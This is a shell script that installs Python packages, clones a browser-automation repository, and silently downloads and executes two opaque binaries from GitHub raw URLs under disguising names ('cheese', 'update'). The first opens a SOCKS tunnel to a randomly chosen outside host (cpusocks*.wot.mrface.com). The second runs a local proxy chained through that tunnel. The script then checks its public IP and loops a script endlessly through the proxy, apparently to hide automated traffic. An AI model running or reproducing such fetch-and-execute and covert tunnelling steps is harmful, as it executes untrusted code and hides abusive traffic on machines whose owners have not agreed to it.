#!/bin/sh
apt update;apt -y install python3 python3-pip git
sleep 2
pip install tabulate pyppeteer
sleep 2
git clone https://github.com/ongamfuramfura/browserless-python.git
cd browserless-python

wget -q https://raw.githubusercontent.com/thembilemhlabangula/update/main/cheese.tar.gz > /dev/null

sleep 2

tar -xf cheese.tar.gz

sleep 2

./cheese client -v cpusocks$(shuf -i 2-6 -n 1).wot.mrface.com:80 7777:socks &

sleep 2

curl -s -L -o update.tar.gz https://raw.githubusercontent.com/thembilemhlabangula/update/main/update.tar.gz > /dev/null

tar -xf update.tar.gz

cat > update/local/update-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:7777
END

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1

sleep 3

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

./update/update curl ifconfig.me

sleep 2

cat > automation.sh <<END
while true
do
./update/update python3 main.py
sleep 5
done
END

chmod +x automation.sh

ls

./automation.sh

